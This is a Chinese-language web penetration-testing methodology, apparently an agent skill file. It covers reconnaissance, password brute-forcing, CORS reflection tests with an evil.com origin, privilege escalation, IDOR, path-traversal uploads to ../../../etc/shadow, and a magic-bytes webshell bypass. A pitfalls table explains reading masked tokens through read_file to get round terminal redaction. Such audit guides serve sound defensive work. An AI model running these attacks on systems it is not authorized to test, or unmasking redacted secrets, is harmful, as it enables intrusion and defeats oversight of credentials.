# Web 平台全量安全审计方法论

针对前后端分离的 Web 管理平台的端到端安全审计流程。适用于 FastAPI/Django/Node.js + React/Vue 技术栈。

## Phase 1: 暴露面侦察

### 1.1 技术栈识别

```bash
# HTTP 响应头分析
curl -sI http://target/ | grep -iE "server:|x-powered"
# Server: nginx/1.14.1 → 已知漏洞 nginx 版本
# X-Powered-By: Express → Node.js 后端

# HTML 入口分析
curl -s http://target/ | grep -oE '<script[^>]*src="[^"]*"'
# 结果: /assets/index-CiqF2vgY.js → Vite 打包产物
```

### 1.2 前端 JS Bundle API 端点提取

Vite/Webpack 打包的 JS bundle（通常 >100KB）含所有 API 端点和路由信息。

```python
import re
with open('bundle.js', 'r', encoding='utf-8', errors='ignore') as f:
    data = f.read()

# 提取 API 调用 (axios/fetch)
api_calls = re.findall(r'(?:Qe|axios|request)\s*\.\s*(?:post|get|put|delete|patch)\s*\(\s*["\']([^"\']+)["\']', data, re.I)
# 提取路由路径
routes = re.findall(r'(?:path|route|to)\s*[:=]\s*["\']([^"\']{2,50})["\']', data)
# 提取 page routes (React Router 模式)
page_routes = [s for s in re.findall(r'["\']([^"\']{2,50})["\']', data) if s.startswith('/') and not s.startswith('//')]
```

关键信息常出现在 bundle 中：
- `/api/auth/login`, `/api/admin/*`, `/api/elf/*` 等业务端点
- React Router 路由映射 (e.g., `/admin`, `/keys`, `/logs`)
- axios 实例配置 (`baseURL: "/api"`)
- 授权中间件逻辑 (`authorization: Bearer ${t}`)

### 1.3 端口扫描

```bash
# 只扫低延迟端口，超时 3s
for port in 22 80 443 3000 5000 8000 8080 8081 8090 8443 8888 9000 9090 9200 5432 3306 6379 27017 5672 15672; do
  code=$(curl -s --connect-timeout 3 -o /dev/null -w "%{http_code}" "http://target:${port}" 2>/dev/null)
  [ "$code" != "000" ] && [ -n "$code" ] && echo "Port $port: $code"
done
```

注意：扫描必须顺序执行（避免触发 WAF），不使用 `&` 并发。

### 1.4 关系梳理

浏览器 F12 Network 面板或前端 bundle 可确认：
- nginx 80: 前端 SPA + `/api/*` 代理
- 后端 FastAPI/Django 运行在某端口（nginx proxy_pass），外部可能不可达
- HTTPS 是否在 nginx 层配置 (443 是否已有证书)

---

## Phase 2: 认证与授权测试

### 2.1 弱口令爆破（无速率限制时）

```python
import requests
url = "http://target/api/auth/login"
passwords = ["admin", "admin123", "123456", "12345678", "password", "root", "shvmp", "SHVMP", "000000", "admin888", "admin123456", "123", "abc123", "passwd"]
for pw in passwords:
    r = requests.post(url, json={"username": "admin", "password": pw}, timeout=10)
    if "access_token" in r.text or r.status_code == 200:
        print(f"[+] SUCCESS: admin:{pw}")
        break
    else:
        print(f"[-] admin:{pw} -> {r.text[:50]}")
```

速率限制测试：连续 15 次失败登录，观察是否有延迟/锁定。无 `X-RateLimit-*` 响应头 = 无限速。

### 2.2 JWT 安全分析

JWT Token 结构分析 (Header.Payload.Signature):

```python
import base64, json
token = "eyJhbG..."
parts = token.split('.')
header = json.loads(base64.b64decode(parts[0] + '=='))
payload = json.loads(base64.b64decode(parts[1] + '=='))
# alg: HS256 → 对称签名，密钥可被离线破解
# exp: → 过期时间，过长 = 风险
# sub: → 用户名/用户标识
```

风险点：
- `alg: HS256` + 签名过短 → 密钥可暴力破解
- `exp` 过长（如 >1年）→ token 长期有效
- payload 含敏感信息（密码、手机号等）→ 未加密仅 base64

### 2.3 CORS Origin 反射测试

```bash
# 测试 1: 恶意 Origin
curl -sI -H "Origin: https://evil.com" http://target/api/endpoint | grep -i "access-control"
# 若返回 Access-Control-Allow-Origin: https://evil.com + Allow-Credentials: true = 高危

# 测试 2: null Origin
curl -sI -H "Origin: null" http://target/api/endpoint | grep -i "access-control"

# 测试 3: 目标 Origin
curl -sI -H "Origin: http://target" http://target/api/endpoint | grep -i "access-control"
```

确认漏洞需：
1. 任意 Origin 被反射返回
2. `Access-Control-Allow-Credentials: true` 同时存在
3. 攻击者网站可跨域发起携带认证的 API 请求

### 2.4 垂直权限越权测试

获得低权限 token 后测试：
```python
# 创建用户时 role 字段可指定
r = requests.post('/api/admin/users', headers=headers, json={
    'username': 'test',
    'password': 'test',
    'role': 'p0'  # 尝试指定最高权限
})
# 若 200 = 可任意创建管理员
```

---

## Phase 3: API 安全测试

### 3.1 IDOR (不安全的直接对象引用)

```python
# 测试顺序/非顺序 ID 访问
r1 = requests.get('/api/admin/users/1', headers=headers)   # 自己
r2 = requests.get('/api/admin/users/2', headers=headers)   # 他人
r999 = requests.get('/api/admin/users/999', headers=headers)  # 不存在
# 注意状态码: 200 vs 403 vs 404 含义不同
```

### 3.2 文件上传 - Path Traversal + 仅 Magic Bytes 检测

```python
import io
# 检测逻辑仅验证 \x7fELF → 可通过 magic bytes + 正常文件内容绕过
test_elf = io.BytesIO(b'\x7fELF' + b'\x00' * 100)
r = requests.post('/api/elf/upload', files={'file': ('../../../etc/shadow', test_elf)})
# filename 含 ../ 未过滤 = path traversal
```

### 3.3 速率限制验证

```python
# 连续 15 次登录失败
for i in range(15):
    r = requests.post('/api/auth/login', json={'username': 'admin', 'password': f'wrong{i}'})
    print(f"  {i+1}: {r.status_code}")
    # 全部 401 + 无延迟 + 无 X-RateLimit-* = 无限速
```

### 3.4 安全响应头检查

```bash
curl -sI http://target | grep -iE "content-security|x-frame|x-content|x-xss|strict-transport|referrer-policy|permissions-policy"
# 全部缺失 = 高风险
```

应存在的头：
- `Content-Security-Policy`
- `X-Frame-Options: DENY` (或 CSP frame-ancestors)
- `X-Content-Type-Options: nosniff`
- `Strict-Transport-Security: max-age=31536000`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy`

---

## Phase 4: 后测试清理

### 4.1 清理测试数据

测试可能创建了用户/密钥/文件等垃圾数据：
```python
# 查看当前状态
r = requests.get('/api/admin/users', headers=headers)
users = r.json()
for u in users:
    if u['username'] not in ['admin']:  # 保留原管理员
        # 尝试 DELETE
        r = requests.delete(f'/api/admin/users/{u["id"]}', headers=headers)
        print(f"DELETE {u['username']}: {r.status_code}")
```

### 4.2 删除残留 Key

```python
r = requests.get('/api/keys', headers=headers)
keys = r.json()
for k in keys:
    if k['key_name'] in ['backdoor-key', 'k1']:
        r = requests.delete(f'/api/keys/{k["id"]}', headers=headers)
```

### 4.3 通知用户

如果测试涉及破坏性操作（创建账户、上传文件），必须明确告知用户哪些残留需要手动清理。某些 DELETE API 可能返回 404，需通过其他方式确认数据状态。

---

## 漏洞严重程度评级参考

| 评级 | 条件 |
|------|------|
| Critical | 弱口令直接 GetShell/管理员权限、CORS+Credentials 反射任意 Origin、SQL 注入可写文件 |
| High | JWT 加密过弱/长期有效、无速率限制可爆破、文件 upload Path Traversal |
| Medium | 缺失安全响应头、日志无 IP 审计、可创建同级管理员 |
| Low | 信息泄露（版本号/路径/错误详情）、非敏感 API 未认证 |

## 报告模板

```markdown
## 漏洞: [名称]

**严重程度**: Critical/High/Medium/Low
**类型**: [CWE-XXX]
**位置**: [URL]

### 描述
[漏洞描述]

### 复现步骤
1. [步骤]
2. [步骤]

### 影响
[影响范围]

### 修复建议
[修复方案]

### 证据
[请求/响应]
```

## 关键陷阱

| 问题 | 解决 |
|------|------|
| DELETE API 返回 404 但数据实际存在 | FastAPI 路由可能用 PUT/POST 替代 DELETE，或需要 query param；遍历多种 HTTP 方法确认 |
| terminal 输出 `***` 脱敏后用 `read_file` 读原始 | JWT token 被脱敏为 `eyJhbG...`，无法直接用 |
| `execute_code` 中 Python 单引号与 bash 冲突 | 用 `curl -o file` 先保存，再 Python `requests` 读取文件 |
| 文件上传仅验证 magic bytes | 可拼接 `\x7fELF` +  webshell/PHP 代码，利用运行环境解析 |
| CORS 反射需 Credentials 同时为 true | 仅有 `Access-Control-Allow-Origin: *` 不代表可利用，必须 `Allow-Credentials: true` 才能携带 cookie/auth |

## 参考

- `references/api-blackbox-testing.md` — 无源码 API 黑盒测试方法
- `references/frontend-js-reverse.md` — 从混淆 JS 提取 API
- `web-methodology.md` — Web 安全测试通用方法
